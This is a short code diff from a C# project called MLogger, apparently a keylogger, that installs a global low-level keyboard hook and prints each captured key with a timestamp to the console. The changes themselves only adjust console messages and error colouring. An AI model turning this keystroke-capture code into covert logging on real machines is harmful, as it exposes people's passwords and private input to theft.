@@ -25,8 +25,9 @@ namespace MLogger
             using (Process curProcess = Process.GetCurrentProcess())
             using (ProcessModule curModule = curProcess.MainModule)
             {
-                //Console.WriteLine("Process - " + curProcess.MachineName + " " + curProcess.Id + " " + curProcess.ProcessName);
                 procc = curProcess;
+
+                Console.WriteLine("Process Init - " + procc.MachineName + " " + procc.Id + " " + procc.ProcessName);
                 return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                     GetModuleHandle(curModule.ModuleName), 0);
             }
@@ -45,7 +46,9 @@ namespace MLogger
                 }
                 catch(Exception e)
                 {
-                    Console.WriteLine("Encountered : " + e.ToString());
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("Encountered : " + e.Message);
+                    Console.ForegroundColor = ConsoleColor.White;
                 }
                 Console.WriteLine((Keys)vkCode + " " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt"));
             }
